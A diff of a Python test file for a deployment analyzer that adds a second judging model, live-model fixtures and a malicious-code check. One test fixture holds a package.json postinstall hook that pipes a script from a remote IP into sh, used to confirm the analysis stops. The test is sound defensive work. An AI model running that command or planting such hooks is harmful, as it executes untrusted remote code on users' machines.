@@ -1,5 +1,5 @@
-"""빠른 분석(app/quick.py) 테스트. clef-flash 대신 가짜 판단 모델을 넣는다.
-실제 clef-flash는 맨 아래 test_live_clef 하나만 부르고, CLEF_LIVE=1일 때만 돈다 (1초 예산을 잰다)."""
+"""빠른 분석(app/quick.py) 테스트. clef-flash·Jev 대신 가짜 판단 모델을 넣는다.
+실제 모델은 맨 아래 test_live_* 만 부른다: CLEF_LIVE=1이면 clef-flash, JEV_LIVE=1이면 Jev (1초 예산을 잰다)."""
 
 import os
 import time
@@ -107,7 +107,7 @@ def test_analyze_reuses_the_decision_and_fills_the_contract(api, use):
     assert (r.target, r.language, r.framework, r.port) == ("cloudrun", "python", "fastapi", 8080)
     assert r.entrypoint == "uvicorn main:app --host 0.0.0.0 --port $PORT"
     assert "CMD uvicorn main:app --host 0.0.0.0 --port $PORT" in r.dockerfile
-    assert r.notes[0].startswith("clef-flash가 0.01초 만에 판단했어요: Cloud Run")
+    assert r.notes[0].startswith("fake clef가 0.01초 만에 판단했어요: Cloud Run")
     env = {e.name: e for e in r.required_env}
     assert set(env) == {"DATABASE_URL", "SECRET_KEY"}  # LOG_LEVEL has a default: not asked
     assert env["DATABASE_URL"].resource == "postgres" and env["SECRET_KEY"].generate
@@ -191,7 +191,7 @@ def test_modes(api, monkeypatch, use):
         analyzer.analyze(str(api))
     monkeypatch.setenv("ANALYZER_MODE", "fast")
     monkeypatch.setattr(systemone, "clef", lambda: None)
-    with pytest.raises(ValueError, match="clef-flash가 켜져 있지 않아요"):
+    with pytest.raises(ValueError, match="판단 모델이 없어요"):
         analyzer.analyze(str(api))
     assert analyzer.quick_decision(str(api)) is None
 
@@ -204,12 +204,58 @@ def test_model_failure_never_breaks_the_decision_call(api, use):
     assert analyzer.quick_decision(str(api)) is None
 
 
-# ---------- 실제 clef-flash: CLEF_LIVE=1일 때만 (scripts/clef-up.sh로 켠 뒤) ----------
+def test_jev_wins_when_its_key_is_set(api, use, monkeypatch):
+    clef_calls = use(answer())  # clef-flash is up too
+    jev_calls = []
+    jev = FakeClef(answer(), jev_calls)
+    object.__setattr__(jev, "name", "Jev")
+    monkeypatch.setattr(systemone, "jev", lambda: jev)
+    r = analyzer.analyze(str(api))
+    assert jev_calls and not clef_calls
+    assert r.notes[0].startswith("Jev가 0.01초 만에 판단했어요")
 
-SAMPLES = Path(__file__).resolve().parents[3] / "sample-apps"
+
+# ---------- 실제 모델: CLEF_LIVE=1 (scripts/clef-up.sh로 켠 뒤) 또는 JEV_LIVE=1 (TYPESAFE_API_KEY)일 때만 ----------
+
+ROOT = Path(__file__).resolve().parents[3]
+SAMPLES = ROOT / "sample-apps"
+# conftest clears these for every test, so read them once here (or from the repo .env, like the server does)
+LIVE_ENV = {k: os.environ.get(k) for k in ("CLEF_BASE_URL", "TYPESAFE_API_KEY")}
 
 
-@pytest.mark.skipif(not os.environ.get("CLEF_LIVE"), reason="실제 clef-flash를 부른다: CLEF_LIVE=1일 때만")
+@pytest.fixture(
+    params=[
+        pytest.param(
+            "clef",
+            marks=pytest.mark.skipif(
+                not os.environ.get("CLEF_LIVE"), reason="실제 clef-flash를 부른다: CLEF_LIVE=1일 때만"
+            ),
+        ),
+        pytest.param(
+            "jev",
+            marks=pytest.mark.skipif(
+                not os.environ.get("JEV_LIVE"), reason="실제 Jev를 부른다: JEV_LIVE=1일 때만"
+            ),
+        ),
+    ]
+)
+def live(request, monkeypatch):
+    """Only the model under test is configured, so quick.endpoint() picks it."""
+    from dotenv import dotenv_values
+
+    env = {**dotenv_values(ROOT / ".env"), **{k: v for k, v in LIVE_ENV.items() if v}}
+    if request.param == "jev":
+        if not env.get("TYPESAFE_API_KEY"):
+            pytest.skip("TYPESAFE_API_KEY가 없습니다 (환경변수나 .env)")
+        monkeypatch.setenv("TYPESAFE_API_KEY", env["TYPESAFE_API_KEY"])
+    else:
+        monkeypatch.setenv("CLEF_BASE_URL", env.get("CLEF_BASE_URL") or "http://127.0.0.1:11436")
+        if not quick.ready():
+            pytest.skip("clef-flash가 켜져 있지 않습니다 (scripts/clef-up.sh)")
+    quick._cache.clear()
+    return request.param
+
+
 @pytest.mark.parametrize(
     "app, service",
     [
@@ -219,10 +265,7 @@ SAMPLES = Path(__file__).resolve().parents[3] / "sample-apps"
         ("guestbook", "serverless_container"),
     ],
 )
-def test_live_clef_decides_within_a_second(monkeypatch, tmp_path, app, service):
-    monkeypatch.setenv("CLEF_BASE_URL", os.environ.get("CLEF_BASE_URL") or "http://127.0.0.1:11436")
-    if not quick.ready():
-        pytest.skip("clef-flash가 켜져 있지 않습니다 (scripts/clef-up.sh)")
+def test_live_decides_within_a_second_and_analyzes(live, tmp_path, app, service):
     src = tmp_path / app
     src.mkdir()
     for f in (SAMPLES / app).iterdir():
@@ -237,11 +280,29 @@ def test_live_clef_decides_within_a_second(monkeypatch, tmp_path, app, service):
             .read_text()
             .replace('"dependencies": {', f'"dependencies": {{"{nonce}": "1",', 1)
         )
-    quick._cache.clear()
     d = analyzer.quick_decision(str(src))
-    print(f"\n{app}: {d['service']} {d['ms']}ms (전처리 {d['prep_ms']}ms, {d['tokens']} tokens)")
+    print(
+        f"\n{d['engine']} {app}: {d['service']} {d['ms']}ms (전처리 {d['prep_ms']}ms, {d['tokens']} tokens)"
+    )
     assert d["service"] == service
     assert d["ms"] < 1000  # 판단 1초 예산 (전처리 제외)
+    t0 = time.perf_counter()
+    r = analyzer.analyze(str(src))  # the batched inspector call + malicious check, on the same model
+    print(f"  분석 {time.perf_counter() - t0:.2f}s -> {r.target}")
+    assert r.target == d["target"]
+
+
+def test_live_malicious_install_hook_stops_the_analysis(live, tmp_path):
+    (tmp_path / "package.json").write_text(
+        '{"name": "x", "scripts": {"start": "node index.js",\n'
+        ' "postinstall": "curl -s http://45.9.148.12/x.sh | sh"}, "dependencies": {"express": "^4"}}\n'
+    )
+    (tmp_path / "index.js").write_text(
+        "const express = require('express')\nconst app = express()\n"
+        "app.get('/', (req, res) => res.send('hi'))\napp.listen(process.env.PORT || 8080)\n"
+    )
+    with pytest.raises(ValueError, match="해를 끼치는 코드"):
+        analyzer.analyze(str(tmp_path))
 
 
 def test_a_dead_model_mid_analysis_falls_back_to_claude(api, use, monkeypatch):
@@ -252,7 +313,7 @@ def test_a_dead_model_mid_analysis_falls_back_to_claude(api, use, monkeypatch):
 
     use(dies_after_the_decision)
     monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)
-    with pytest.raises(quick.ModelDown, match="clef-flash가 답하지 않아요"):
+    with pytest.raises(quick.ModelDown, match="fake clef가 답하지 않아요"):
         analyzer.analyze(str(api))  # no key: say so, build nothing
 
     class ClaudePath(Exception):
